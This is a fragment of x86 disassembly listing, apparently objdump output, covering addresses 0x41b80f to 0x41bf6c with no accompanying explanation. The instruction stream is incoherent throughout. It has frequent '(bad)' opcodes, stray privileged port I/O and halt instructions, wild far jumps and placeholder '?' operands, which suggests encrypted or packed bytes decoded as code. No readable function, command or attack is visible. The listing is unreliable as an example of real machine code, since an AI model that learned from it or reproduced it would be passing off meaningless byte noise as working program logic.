  41b80f:	adc    ch,BYTE PTR [ebx-0x2c63c559]
  41b815:	cmc    
  41b816:	scas   al,BYTE PTR es:[edi]
  41b817:	cld    
  41b818:	out    0x9,eax
  41b81a:	push   ds
  41b81b:	cmp    eax,0x58e0ae2
  41b820:	call   0xe6261fa9
  41b825:	call   0xc239bf15
  41b82a:	cmp    ebp,DWORD PTR [esi+0x7eae03d3]
  41b830:	loopne 0x41b7df
  41b832:	or     eax,0xa7430a5b
  41b837:	mov    ss,WORD PTR [eax+0x53ae219e]
  41b83d:	sbb    DWORD PTR ss:[edi-0x20df7a51],edi
  41b844:	mov    bh,0xa5
  41b846:	xlat   BYTE PTR ds:[ebx]
  41b847:	fsubr  DWORD PTR [ebx]
  41b849:	pop    es
  41b84a:	sub    edi,esi
  41b84c:	push   ebx
  41b84d:	mov    al,0x1b
  41b84f:	xor    DWORD PTR [esi-0x4fb827c5],esp
  41b855:	pop    es
  41b856:	not    BYTE PTR [edi+0x61]
  41b859:	push   esi
  41b85a:	scas   al,BYTE PTR es:[edi]
  41b85b:	xor    ebp,DWORD PTR [esi]
  41b85d:	retf   0x7a44
  41b860:	dec    esp
  41b861:	xchg   esp,eax
  41b862:	pop    edx
  41b863:	outs   dx,BYTE PTR ds:[esi]
  41b864:	fwait
  41b865:	pop    ss
  41b866:	sub    eax,0x8e9e2b6c
  41b86b:	hlt    
  41b86c:	mov    BYTE PTR [eax+0x102b82],0xfd
  41b873:	lods   al,BYTE PTR ds:[esi]
  41b874:	add    ebp,eax
  41b876:	repnz int 0xba
  41b879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b87a:	or     BYTE PTR [eax-0x6],0x59
  41b87e:	adc    dh,bl
  41b880:	mov    ah,0xc7
  41b882:	mov    ds,WORD PTR [edi-0x54]
  41b885:	push   0xffffffff
  41b887:	xlat   BYTE PTR ds:[ebx]
  41b888:	js     0x41b80b
  41b88a:	fdiv   DWORD PTR [ebx]
  41b88c:	push   ebp
  41b88d:	les    esp,FWORD PTR [eax+0x2c]
  41b890:	shr    DWORD PTR [ebp+0x78d23ee3],cl
  41b896:	dec    bl
  41b898:	add    bl,BYTE PTR [edi+ebx*1]
  41b89b:	mov    edi,0xbccd3aec
  41b8a0:	mov    ds:0xec607a48,al
  41b8a5:	in     eax,0x1e
  41b8a7:	push   esp
  41b8a8:	jmp    0x81a19f04
  41b8ad:	inc    ebx
  41b8ae:	push   edx
  41b8af:	cmp    DWORD PTR [edi],ecx
  41b8b1:	retf   
  41b8b2:	scas   eax,DWORD PTR es:[edi]
  41b8b3:	or     eax,0xea6da820
  41b8b8:	neg    DWORD PTR [esi+ecx*4+0x39]
  41b8bc:	jp     0x41b8c8
  41b8be:	dec    ebp
  41b8bf:	das    
  41b8c0:	shl    DWORD PTR [edx+edx*2+0x760e75ab],cl
  41b8c7:	rol    DWORD PTR [eax+edi*4],0x59
  41b8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8cc:	fcomp  DWORD PTR [ecx]
  41b8ce:	jle    0x41b8fd
  41b8d0:	das    
  41b8d1:	ds jecxz 0x41b940
  41b8d4:	sub    edx,edx
  41b8d6:	(bad)  
  41b8d7:	loopne 0x41b929
  41b8d9:	adc    edx,esi
  41b8db:	xchg   esi,eax
  41b8dc:	pop    ebp
  41b8dd:	(bad)  
  41b8df:	in     al,0x4d
  41b8e1:	pop    ecx
  41b8e2:	sqrtps xmm7,XMMWORD PTR [ecx+0x9]
  41b8e6:	inc    ecx
  41b8e7:	aas    
  41b8e8:	mov    BYTE PTR [edx+0x18],bl
  41b8eb:	cmp    al,0xff
  41b8ed:	push   eax
  41b8ee:	dec    ebp
  41b8ef:	addr16 cmp eax,0xf2009ed6
  41b8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8f6:	push   esp
  41b8f7:	sbb    dl,dl
  41b8f9:	and    ch,0x8b
  41b8fc:	jb     0x41b8c2
  41b8fe:	pop    ecx
  41b8ff:	mov    ds:0x1a76a2a2,eax
  41b904:	inc    ecx
  41b905:	mov    dl,0x42
  41b907:	jnp    0x41b97f
  41b909:	add    al,0x4e
  41b90b:	repnz pop edx
  41b90e:	lea    ebx,[esi+0x6c]
  41b911:	gs sub edi,esp
  41b914:	scas   eax,DWORD PTR es:[edi]
  41b915:	push   ecx
  41b916:	mov    BYTE PTR [ecx-0xf],ah
  41b919:	pop    ebx
  41b91a:	stos   BYTE PTR es:[edi],al
  41b91b:	mov    ah,0xc4
  41b91d:	and    DWORD PTR [esi-0x2d3b6796],ebp
  41b923:	leave  
  41b924:	shl    BYTE PTR [ebx-0x42],0xdf
  41b928:	repz cdq 
  41b92a:	xchg   ebx,eax
  41b92b:	jp     0x41b8d3
  41b92d:	in     eax,0xea
  41b92f:	rol    al,0xe2
  41b932:	adc    BYTE PTR [ebp+0x79822df4],cl
  41b938:	aam    0x9a
  41b93a:	mov    esi,0x5e589800
  41b93f:	outs   dx,DWORD PTR ds:[esi]
  41b940:	or     ebp,edx
  41b942:	fsubr  QWORD PTR [ebx+0x41f59832]
  41b948:	ja     0x41b97f
  41b94a:	inc    edx
  41b94b:	push   ds
  41b94c:	pop    esi
  41b94d:	inc    ecx
  41b94f:	popf   
  41b950:	data16 cmc 
  41b952:	mov    ebp,0xe476a714
  41b957:	add    eax,0x6629f785
  41b95c:	sbb    bh,BYTE PTR [ebx-0x1b]
  41b95f:	aad    0x7b
  41b961:	imul   edx,DWORD PTR ds:0xebb1aee4,0x41
  41b968:	mov    eax,0x5d40bb82
  41b96d:	scas   al,BYTE PTR es:[edi]
  41b96e:	sbb    DWORD PTR [esi],esp
  41b970:	popa   
  41b971:	ds cmp al,0x46
  41b974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b975:	mov    bl,BYTE PTR [ecx-0x3a4ee030]
  41b97b:	pop    ss
  41b97c:	inc    esi
  41b97d:	xchg   DWORD PTR [ebp+0x163b944f],eax
  41b983:	jge    0x41b97e
  41b985:	jmp    0x67aa:0xe2b592d3
  41b98c:	fild   QWORD PTR [ebp+0x0]
  41b98f:	jl     0x41b949
  41b991:	rcr    DWORD PTR [ebx],0xa3
  41b994:	inc    edx
  41b995:	push   ebx
  41b996:	pop    ecx
  41b997:	loopne 0x41b9d8
  41b999:	pushf  
  41b99a:	(bad)  
  41b99b:	xor    bl,BYTE PTR [esi]
  41b99d:	popa   
  41b99e:	fwait
  41b99f:	or     DWORD PTR [ecx-0x7ff41f3d],edx
  41b9a5:	out    dx,eax
  41b9a6:	pop    ebp
  41b9a7:	jno    0x41b946
  41b9a9:	enter  0xb215,0x60
  41b9ad:	aaa    
  41b9ae:	mov    ecx,0x22f72613
  41b9b3:	cmp    DWORD PTR [ebx],ebp
  41b9b5:	jmp    0x5dca6aea
  41b9ba:	xor    ch,dh
  41b9bc:	add    DWORD PTR [eax],0x8fd51d06
  41b9c2:	xchg   ebp,eax
  41b9c3:	or     BYTE PTR [ecx],ah
  41b9c5:	add    al,0xaa
  41b9c7:	shl    DWORD PTR [ecx-0x13d1dee],cl
  41b9cd:	pop    ss
  41b9ce:	cwde   
  41b9cf:	cmp    eax,0x7c080ac4
  41b9d4:	aad    0xb0
  41b9d6:	adc    ecx,ecx
  41b9d8:	sti    
  41b9d9:	ss push es
  41b9db:	jl     0x41b9b1
  41b9dd:	mov    WORD PTR [eax+0x6166c113],?
  41b9e3:	mov    BYTE PTR [ecx-0x11d06bd3],dl
  41b9e9:	jmp    0xd2a22210
  41b9ee:	cdq    
  41b9ef:	ins    DWORD PTR es:[edi],dx
  41b9f0:	mov    ch,0x6a
  41b9f2:	mov    ebp,0xd600af8c
  41b9f7:	in     al,dx
  41b9f8:	add    DWORD PTR [eax+0x3b],eax
  41b9fb:	adc    edi,ecx
  41b9fd:	js     0x41b985
  41b9ff:	cmp    BYTE PTR [eax+eax*4+0x2ab20a45],ah
  41ba06:	inc    edi
  41ba07:	imul   edi,DWORD PTR [esi-0x48],0xc110781e
  41ba0e:	hlt    
  41ba0f:	adc    DWORD PTR [ecx-0x3e],0x803eaeaf
  41ba16:	(bad)  
  41ba17:	and    al,0x9d
  41ba19:	into   
  41ba1a:	arpl   WORD PTR [ebx+0x28],ax
  41ba1d:	inc    edx
  41ba1e:	and    ebp,ecx
  41ba20:	out    dx,al
  41ba21:	mov    eax,ds:0x56318589
  41ba26:	in     eax,dx
  41ba27:	dec    eax
  41ba28:	and    al,0xb6
  41ba2a:	retf   0x712f
  41ba2d:	dec    ebx
  41ba2e:	cmc    
  41ba2f:	add    al,0xc
  41ba31:	(bad)  
  41ba32:	jp     0x41ba76
  41ba34:	push   ss
  41ba35:	sub    BYTE PTR [edx+0x1fac85b6],dh
  41ba3b:	xor    DWORD PTR [edx-0x45],ebx
  41ba3e:	mov    ?,esi
  41ba40:	pop    ebx
  41ba41:	mov    ds:0xb82e1ac1,al
  41ba46:	(bad)  [edi-0x20395dae]
  41ba4c:	sbb    DWORD PTR [eax+0x5ce9332e],eax
  41ba52:	ds cli 
  41ba54:	pop    ebp
  41ba55:	das    
  41ba56:	xor    esi,DWORD PTR [ebx+0x64]
  41ba59:	fnsave [eax+edx*8]
  41ba5c:	test   esi,esp
  41ba5e:	test   BYTE PTR [ecx+0x226ab1ac],al
  41ba64:	jmp    0x41ba63
  41ba66:	mov    BYTE PTR [ebp+esi*1-0x20],dl
  41ba6a:	fmul   DWORD PTR [ecx-0x6b]
  41ba6d:	adc    esp,DWORD PTR [eax+ebp*4-0x790d5295]
  41ba74:	and    ecx,DWORD PTR [eax]
  41ba76:	sbb    BYTE PTR [eax-0x72195260],bl
  41ba7c:	out    dx,al
  41ba7d:	hlt    
  41ba7e:	and    BYTE PTR [ebx-0x1d],al
  41ba81:	mov    esi,0xd040f4d2
  41ba86:	jp     0x41bac8
  41ba88:	sbb    bl,BYTE PTR [edi]
  41ba8a:	ds hlt 
  41ba8c:	push   ss
  41ba8d:	ds jmp 0x41ba9c
  41ba90:	xchg   edi,eax
  41ba91:	mov    BYTE PTR [edx],cl
  41ba93:	xor    edi,DWORD PTR [edx+0x18ff305c]
  41ba99:	jecxz  0x41ba95
  41ba9b:	dec    esp
  41ba9c:	xor    esi,edi
  41ba9e:	and    al,0xbf
  41baa0:	adc    al,0xa6
  41baa2:	daa    
  41baa3:	sti    
  41baa4:	aas    
  41baa5:	add    ebp,eax
  41baa7:	ds jge 0x41ba34
  41baaa:	(bad)  
  41baab:	dec    edi
  41baac:	push   ebx
  41baad:	pushf  
  41baae:	popa   
  41baaf:	inc    esp
  41bab0:	shr    DWORD PTR [edi+0x2c5703ef],1
  41bab6:	cs jns 0x41ba52
  41bab9:	mov    BYTE PTR [ebx+0x5e8d4ccc],0x79
  41bac0:	sub    al,0xdd
  41bac2:	or     al,ch
  41bac4:	mov    BYTE PTR [esi],bh
  41bac6:	cld    
  41bac7:	pop    edx
  41bac8:	mov    edi,0x94cd4c55
  41bacd:	and    BYTE PTR [edx+0x7a62bd61],0x7b
  41bad4:	cmp    ebp,DWORD PTR [edx+edi*4]
  41bad7:	data16 and BYTE PTR [edi-0x31dd9043],cl
  41bade:	lock add al,0xfc
  41bae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bae2:	sti    
  41bae3:	in     eax,dx
  41bae4:	mov    dh,0xbb
  41bae6:	shl    DWORD PTR [edi+0x2ca5aa2e],0xa6
  41baed:	scas   eax,DWORD PTR es:[edi]
  41baee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baef:	outs   dx,BYTE PTR ds:[esi]
  41baf0:	ror    BYTE PTR [eax-0x1e],0xfc
  41baf4:	out    0xd6,eax
  41baf6:	jecxz  0x41ba9a
  41baf8:	mov    esi,0x48161ba5
  41bafd:	imul   esi,DWORD PTR [edx+0x30],0xffffffa9
  41bb01:	dec    esp
  41bb02:	sub    DWORD PTR [ecx-0x536a9bd5],ecx
  41bb08:	mov    bh,0xc8
  41bb0a:	jbe    0x41ba9e
  41bb0c:	sub    DWORD PTR [esi-0x10d21573],esp
  41bb12:	in     al,0x5b
  41bb14:	jge    0x41bb88
  41bb16:	or     BYTE PTR [ecx+eax*8+0x63],dh
  41bb1a:	out    0x4,al
  41bb1c:	addr16 es jbe 0x41bb2b
  41bb20:	jg     0x41bb6f
  41bb22:	aaa    
  41bb23:	ret    
  41bb24:	push   0xfffffffb
  41bb26:	ss jl  0x41bb6b
  41bb29:	cmp    al,BYTE PTR [esi]
  41bb2b:	push   ebx
  41bb2c:	ret    
  41bb2d:	sub    dl,BYTE PTR [eax-0x436e8aa4]
  41bb33:	int    0xa
  41bb35:	xor    al,ch
  41bb37:	mul    BYTE PTR [edx+0x2a0cbe58]
  41bb3d:	stc    
  41bb3e:	scas   eax,DWORD PTR es:[edi]
  41bb3f:	push   es
  41bb40:	and    BYTE PTR [ebx],bh
  41bb42:	es push edx
  41bb44:	outs   dx,DWORD PTR ds:[esi]
  41bb45:	jne    0x41bb2f
  41bb47:	addr16 (bad) 
  41bb49:	(bad)  
  41bb4a:	scas   eax,DWORD PTR es:[edi]
  41bb4b:	cdq    
  41bb4c:	imul   ebx,DWORD PTR [eax-0x5d],0xfe56e20d
  41bb53:	test   BYTE PTR [edx],dl
  41bb55:	in     eax,dx
  41bb56:	(bad)  
  41bb57:	call   0xc497:0x410a7887
  41bb5e:	mov    BYTE PTR [esp+edx*4+0x38],bh
  41bb62:	xor    eax,0xae4c8d4e
  41bb67:	int    0x4
  41bb69:	xchg   esi,eax
  41bb6a:	(bad)  
  41bb6b:	outs   dx,DWORD PTR ds:[esi]
  41bb6c:	sub    BYTE PTR [ecx],ah
  41bb6e:	clc    
  41bb6f:	xor    ecx,esi
  41bb71:	and    ecx,DWORD PTR [edi-0x6c42b983]
  41bb77:	and    BYTE PTR [ebx-0x39],0x5b
  41bb7b:	jnp    0x41bb34
  41bb7d:	jo     0x41bb2f
  41bb7f:	scas   al,BYTE PTR es:[edi]
  41bb80:	es and eax,0x76c307e4
  41bb86:	pushf  
  41bb87:	and    BYTE PTR [eax+0x63cba2c0],ch
  41bb8d:	call   0x3dcb:0x2eb7f287
  41bb94:	push   edx
  41bb95:	out    dx,eax
  41bb96:	push   ebp
  41bb97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb98:	jne    0x41bb26
  41bb9a:	jbe    0x41bc1a
  41bb9c:	test   esp,0x5011203f
  41bba2:	daa    
  41bba3:	jb     0x41bbae
  41bba5:	dec    eax
  41bba6:	mov    cl,0xf5
  41bba8:	int    0x37
  41bbaa:	mov    esp,0x44c9f3b4
  41bbaf:	rcr    BYTE PTR [edi+edi*2-0x17],cl
  41bbb3:	loope  0x41bb80
  41bbb5:	adc    esi,DWORD PTR [edi+0x15adeff0]
  41bbbb:	adc    eax,0xfb46e050
  41bbc0:	xchg   ebx,eax
  41bbc1:	jb     0x41bb6c
  41bbc3:	and    edx,ebp
  41bbc5:	fmul   QWORD PTR [edx-0x5]
  41bbc8:	xor    al,0x6
  41bbca:	mov    ebp,0x9287e2e1
  41bbcf:	add    ch,cl
  41bbd1:	outs   dx,BYTE PTR ds:[esi]
  41bbd2:	sbb    eax,0x1eaa2fb
  41bbd7:	adc    DWORD PTR [eax],0xd
  41bbda:	inc    ebx
  41bbdb:	xor    al,0x6c
  41bbdd:	sub    eax,edx
  41bbdf:	jle    0x41bc4d
  41bbe1:	xlat   BYTE PTR ds:[ebx]
  41bbe2:	fadd   DWORD PTR [esi+0x1a]
  41bbe5:	sub    DWORD PTR [ecx],edi
  41bbe7:	stc    
  41bbe8:	xchg   esp,eax
  41bbe9:	mov    bh,0x40
  41bbeb:	(bad)  
  41bbed:	mov    ebx,0xc0810bd9
  41bbf2:	add    ah,BYTE PTR [ebp-0x76]
  41bbf5:	inc    esi
  41bbf6:	je     0x41bc60
  41bbf8:	outs   dx,BYTE PTR ds:[esi]
  41bbf9:	fistp  QWORD PTR [edi-0x4e79aafa]
  41bbff:	cmc    
  41bc00:	(bad)  
  41bc01:	and    DWORD PTR [ebp-0x3c244f47],esi
  41bc07:	rcr    BYTE PTR [ecx-0x558f33c4],cl
  41bc0d:	cld    
  41bc0e:	sbb    bl,BYTE PTR [ebp-0x76d8d149]
  41bc14:	das    
  41bc15:	iret   
  41bc16:	cmc    
  41bc17:	leave  
  41bc18:	imul   esp,DWORD PTR [ecx+0x6e3781f8],0x9017013b
  41bc22:	push   ecx
  41bc23:	in     eax,0x43
  41bc25:	fucomp st(1)
  41bc27:	inc    ecx
  41bc28:	clc    
  41bc29:	inc    eax
  41bc2a:	retf   0xf4da
  41bc2d:	adc    al,0x97
  41bc2f:	lahf   
  41bc30:	xchg   ecx,eax
  41bc31:	test   eax,0x91173d9a
  41bc36:	push   edx
  41bc37:	add    bh,al
  41bc39:	pusha  
  41bc3a:	jmp    0x41bbe0
  41bc3c:	add    DWORD PTR ds:0x4b8be04a,0x54
  41bc43:	sbb    BYTE PTR [eax-0x73],ah
  41bc46:	cmc    
  41bc47:	add    eax,0x33cd272b
  41bc4c:	mov    edx,0x2abdc545
  41bc51:	sti    
  41bc52:	pop    es
  41bc53:	xchg   BYTE PTR [eax+0x27],al
  41bc56:	sub    edx,DWORD PTR [ecx-0x5b9a2ffc]
  41bc5c:	dec    ebp
  41bc5d:	jb     0x41bcce
  41bc5f:	fwait
  41bc60:	mov    esi,0x687fa8c6
  41bc65:	sbb    esp,DWORD PTR [edi]
  41bc67:	xchg   BYTE PTR [edx-0x62],dl
  41bc6a:	mov    DWORD PTR [ebx+ebp*8+0x6a],edi
  41bc6e:	fs sbb al,0xa6
  41bc71:	mov    edi,0xa39319a4
  41bc76:	int    0x38
  41bc78:	clc    
  41bc79:	mov    ebp,0x5a32c6be
  41bc7e:	mov    al,0x12
  41bc80:	fst    QWORD PTR cs:0x5846ff91
  41bc87:	in     al,dx
  41bc88:	repz and al,0xd9
  41bc8b:	pusha  
  41bc8c:	inc    esp
  41bc8d:	xor    dl,BYTE PTR [ebp+0x3987ab67]
  41bc93:	mov    al,0x23
  41bc95:	dec    eax
  41bc96:	and    edi,DWORD PTR [ecx+0x57]
  41bc99:	shl    DWORD PTR [eax-0x7f],0x91
  41bc9d:	sbb    al,0xc8
  41bc9f:	xor    edi,ebp
  41bca1:	lods   al,BYTE PTR ds:[esi]
  41bca2:	rcl    BYTE PTR [eax],1
  41bca4:	lds    edi,FWORD PTR [eax+0x3df10444]
  41bcaa:	or     al,0xe7
  41bcac:	jae    0x41bc5e
  41bcae:	aas    
  41bcaf:	adc    ch,BYTE PTR [ecx+0x67fb12c0]
  41bcb5:	(bad)
  41bcb9:	jmp    0xaa259a18
  41bcbe:	xchg   edx,eax
  41bcbf:	pop    edx
  41bcc0:	sub    eax,0xa0999ced
  41bcc5:	push   ss
  41bcc6:	jne    0x41bcfd
  41bcc8:	mov    al,ds:0x7e578be
  41bccd:	scas   al,BYTE PTR es:[edi]
  41bcce:	(bad)  
  41bccf:	pop    es
  41bcd0:	lea    ebx,[ecx-0x71c2cbd4]
  41bcd6:	(bad)  
  41bcd7:	call   0xd81c95f4
  41bcdc:	in     al,0x35
  41bcde:	adc    ebp,esp
  41bce0:	fdivr  DWORD PTR [edx+0xb]
  41bce3:	jno    0x41bce0
  41bce5:	aas    
  41bce6:	std    
  41bce7:	pop    eax
  41bce8:	fwait
  41bce9:	mov    cl,0x9b
  41bceb:	sbb    bl,BYTE PTR [edx]
  41bced:	inc    esp
  41bcee:	(bad)  
  41bcef:	jmp    0x7c88:0xf0d1abd
  41bcf6:	or     dl,BYTE PTR [eax]
  41bcf8:	ja     0x41bcaa
  41bcfa:	inc    eax
  41bcfb:	and    DWORD PTR ds:0x101a4901,0x718dde36
  41bd05:	gs mov ecx,0xe140d090
  41bd0b:	ja     0x41bc91
  41bd0d:	bound  esp,QWORD PTR [esi]
  41bd0f:	mov    esi,0xd5258859
  41bd14:	mov    ds:0xc296da65,eax
  41bd19:	outs   dx,DWORD PTR ds:[esi]
  41bd1a:	(bad)  
  41bd1b:	and    esp,edi
  41bd1d:	jecxz  0x41bd91
  41bd1f:	pushf  
  41bd20:	aam    0xa4
  41bd22:	xchg   edi,eax
  41bd23:	mov    bh,0x73
  41bd25:	dec    edx
  41bd26:	xchg   DWORD PTR [edi+0x66],ebx
  41bd29:	test   al,0x10
  41bd2b:	jae    0x41bcff
  41bd2d:	std    
  41bd2e:	mov    ebx,edi
  41bd30:	xchg   DWORD PTR [ecx-0x69cb3237],ecx
  41bd36:	(bad)  [ecx+0x13cdd1ee]
  41bd3c:	das    
  41bd3d:	adc    ebx,DWORD PTR [ecx]
  41bd3f:	sbb    edi,DWORD PTR [edi-0x43]
  41bd42:	push   0x2fe70629
  41bd47:	jo     0x41bdba
  41bd49:	pop    esp
  41bd4a:	push   esp
  41bd4b:	sub    BYTE PTR [edx+0x5c],dl
  41bd4e:	retf   
  41bd4f:	sub    edi,DWORD PTR [ecx+edi*2]
  41bd52:	int3   
  41bd53:	loopne 0x41bda0
  41bd55:	leave  
  41bd56:	mov    ah,0xe9
  41bd58:	js     0x41bd9b
  41bd5a:	xchg   esp,eax
  41bd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd5c:	mov    cl,0x55
  41bd5e:	push   ss
  41bd5f:	ds push esp
  41bd61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd62:	sub    bl,ch
  41bd64:	jo     0x41bd97
  41bd66:	xchg   DWORD PTR [edi],eax
  41bd68:	sub    eax,0xf5be3722
  41bd6d:	push   eax
  41bd6e:	sub    esi,ecx
  41bd70:	stc    
  41bd71:	push   ebp
  41bd72:	pop    ebx
  41bd73:	data16 scas al,BYTE PTR es:[edi]
  41bd75:	jge    0x41bcf7
  41bd77:	or     DWORD PTR [ecx-0x4e86d304],esi
  41bd7d:	push   0x26445f63
  41bd82:	lea    ecx,[ecx]
  41bd84:	into   
  41bd85:	xchg   ebx,eax
  41bd86:	and    al,0x19
  41bd88:	out    dx,al
  41bd89:	mov    bh,0x3b
  41bd8b:	enter  0xc1a0,0x8d
  41bd8f:	cli    
  41bd90:	int    0xa7
  41bd92:	mov    dl,0x7d
  41bd94:	mov    ebp,0xa482496f
  41bd99:	pop    edx
  41bd9a:	cmc    
  41bd9b:	push   edx
  41bd9c:	imul   eax,DWORD PTR [eax+edx*8],0x43
  41bda0:	or     BYTE PTR [ebx],cl
  41bda2:	in     al,dx
  41bda3:	(bad)  
  41bda4:	mov    eax,0x163295ee
  41bda9:	loopne 0x41bdf0
  41bdab:	inc    esp
  41bdac:	cli    
  41bdad:	inc    eax
  41bdae:	mov    dl,0x59
  41bdb0:	pop    ebp
  41bdb1:	adc    ch,dh
  41bdb3:	retf   0x1060
  41bdb6:	and    BYTE PTR [ebx+eiz*4+0x8],dh
  41bdba:	jb     0x41bd65
  41bdbc:	aam    0xc2
  41bdbe:	retf   
  41bdbf:	sub    eax,0x6967c3a2
  41bdc4:	cli    
  41bdc5:	mov    ds:0xc7d5eb3a,al
  41bdca:	test   eax,0x559ddc76
  41bdcf:	add    ebp,DWORD PTR [esi+0x16]
  41bdd2:	jg     0x41be21
  41bdd4:	and    al,0x13
  41bdd6:	and    eax,0xf89f66f4
  41bddb:	xchg   esi,eax
  41bddc:	pop    ds
  41bddd:	stos   DWORD PTR es:[edi],eax
  41bdde:	inc    esi
  41bddf:	sbb    BYTE PTR [ebp-0x1949062a],bl
  41bde5:	cmp    BYTE PTR [eax],dh
  41bde7:	imul   edi,DWORD PTR [ebx+ebx*2-0x79],0x1a
  41bdec:	jne    0x41be39
  41bdee:	shl    dl,0x8c
  41bdf1:	in     al,0x3a
  41bdf3:	jae    0x41be16
  41bdf5:	sub    eax,eax
  41bdf7:	mov    ecx,0x8c0cc81f
  41bdfc:	push   eax
  41bdfd:	cmp    eax,0xbaff7ffa
  41be02:	xchg   edi,eax
  41be03:	xor    bh,BYTE PTR [edi+ecx*1-0x7462b63c]
  41be0a:	xchg   ebp,eax
  41be0b:	add    eax,ebx
  41be0d:	imul   eax,edi,0x10
  41be10:	xor    BYTE PTR ds:0xa04a0695,dl
  41be16:	test   DWORD PTR [esp+ecx*2],esi
  41be19:	jecxz  0x41bdc7
  41be1b:	in     eax,dx
  41be1c:	adc    DWORD PTR [esi],edi
  41be1e:	nop
  41be1f:	nop
  41be20:	leave  
  41be21:	fld    QWORD PTR [edi+0x1f]
  41be24:	push   eax
  41be25:	(bad)  
  41be26:	jecxz  0x41be98
  41be28:	inc    esp
  41be29:	push   ecx
  41be2a:	out    0x73,al
  41be2c:	jmp    0x41be8b
  41be2e:	mov    ah,0xef
  41be30:	or     esi,DWORD PTR [edi+0x7]
  41be33:	repz or al,BYTE PTR [ecx+eiz*4-0x52]
  41be38:	mov    bl,0x87
  41be3a:	and    ebp,0x70c62170
  41be40:	adc    al,0xb4
  41be42:	add    BYTE PTR es:[eax],dh
  41be45:	cmp    eax,0xdd672845
  41be4a:	mov    bl,0x9
  41be4c:	dec    esp
  41be4d:	jnp    0x41be77
  41be4f:	push   ebx
  41be50:	int3   
  41be51:	xor    BYTE PTR [edx+0x50],dl
  41be54:	xchg   ebx,eax
  41be55:	cmp    al,0x7b
  41be57:	sti    
  41be58:	(bad)  
  41be59:	push   esi
  41be5a:	push   edi
  41be5b:	or     DWORD PTR [ebx+0x73],edx
  41be5e:	(bad)  
  41be5f:	aas    
  41be60:	dec    ebp
  41be61:	outs   dx,DWORD PTR ds:[esi]
  41be62:	jbe    0x41be6f
  41be64:	pop    eax
  41be65:	inc    esi
  41be66:	addr16 arpl cx,bp
  41be69:	mov    ds:0x67ac5ce6,al
  41be6e:	dec    ebx
  41be6f:	sub    ecx,DWORD PTR [eax-0x66]
  41be72:	pop    ss
  41be73:	(bad)  
  41be75:	mov    esi,ebx
  41be77:	mov    eax,ds:0x2717560b
  41be7c:	mov    bh,0x8d
  41be7e:	inc    ebp
  41be7f:	cld    
  41be80:	lods   eax,DWORD PTR ds:[esi]
  41be81:	repz push esp
  41be83:	sub    BYTE PTR [eax+edi*2],ch
  41be86:	je     0x41be4c
  41be88:	cs ins DWORD PTR es:[edi],dx
  41be8a:	jl     0x41be35
  41be8c:	imul   ecx,DWORD PTR [esi+0x44578085],0x33
  41be93:	(bad)  
  41be95:	or     dl,BYTE PTR [edx+esi*8]
  41be98:	jns    0x41be7f
  41be9a:	adc    bl,0x92
  41be9d:	mov    al,ds:0xf01f09b2
  41bea2:	xlat   BYTE PTR ds:[ebx]
  41bea3:	lea    esi,[esi+edi*4]
  41bea6:	jns    0x41bf23
  41bea8:	adc    ah,BYTE PTR [eax-0x6c]
  41beab:	jg     0x41bec0
  41bead:	jl     0x41bea0
  41beaf:	sbb    eax,0xf5d6ccde
  41beb4:	sbb    BYTE PTR [edx],bh
  41beb6:	ret    0x6589
  41beb9:	fldcw  WORD PTR [ebp-0x66551dc]
  41bebf:	jle    0x41be8b
  41bec1:	cs inc esp
  41bec3:	out    0xf0,eax
  41bec5:	push   eax
  41bec6:	xor    eax,DWORD PTR [edi]
  41bec8:	enter  0x15d1,0x34
  41becc:	mov    ch,0xc8
  41bece:	je     0x41bf3d
  41bed0:	(bad)  
  41bed1:	out    dx,eax
  41bed2:	push   esi
  41bed3:	adc    eax,0x93f22896
  41bed8:	sbb    eax,0xf1bd4cc4
  41bedd:	and    dh,BYTE PTR ds:0x23ab2ed
  41bee3:	int    0x2b
  41bee5:	shl    DWORD PTR [ebp+0x665da744],1
  41beeb:	stos   BYTE PTR es:[edi],al
  41beec:	mov    al,0x7c
  41beee:	dec    edi
  41beef:	jmp    0x41beb1
  41bef1:	jae    0x41bea0
  41bef3:	mov    ds:0xfb756864,al
  41bef8:	mov    dl,0x1f
  41befa:	stos   DWORD PTR es:[edi],eax
  41befb:	sbb    eax,0x4bb84d35
  41bf00:	ins    DWORD PTR es:[edi],dx
  41bf01:	jmp    0xb74c4e71
  41bf06:	ins    DWORD PTR es:[edi],dx
  41bf07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf08:	hlt    
  41bf09:	outs   dx,DWORD PTR ds:[esi]
  41bf0a:	cmp    eax,0x41a98825
  41bf0f:	cdq    
  41bf10:	cs in  al,0x32
  41bf13:	push   esi
  41bf14:	or     DWORD PTR [ebx],ecx
  41bf16:	aam    0x8a
  41bf18:	(bad)  [ebx]
  41bf1a:	jmp    0x3433:0x8b4e6f6b
  41bf21:	div    BYTE PTR [edi-0x39d427c7]
  41bf27:	sbb    DWORD PTR [ecx-0x5ac91d05],eax
  41bf2d:	or     eax,0x35cf9e52
  41bf32:	or     dl,BYTE PTR [esi+eiz*2]
  41bf35:	cmp    DWORD PTR [eax],ecx
  41bf37:	dec    eax
  41bf38:	int3   
  41bf39:	adc    BYTE PTR [eax-0x437ff7d2],0xef
  41bf40:	push   eax
  41bf41:	into   
  41bf42:	mov    ch,0xca
  41bf45:	mov    al,BYTE PTR [ebp+0x7c]
  41bf48:	lahf   
  41bf49:	ret    0x5999
  41bf4c:	push   cs
  41bf4d:	inc    BYTE PTR [ebp-0x55]
  41bf50:	inc    esp
  41bf51:	aas    
  41bf52:	fidiv  WORD PTR [eax]
  41bf54:	adc    cl,BYTE PTR [ebx]
  41bf56:	mov    ecx,0x97ca41ab
  41bf5b:	iret   
  41bf5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf5d:	sub    eax,0x6094b9f5
  41bf62:	mov    dl,0xba
  41bf64:	aad    0x8f
  41bf66:	aas    
  41bf67:	je     0x41bfd9
  41bf69:	aam    0xeb
  41bf6b:	out    dx,al
  41bf6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
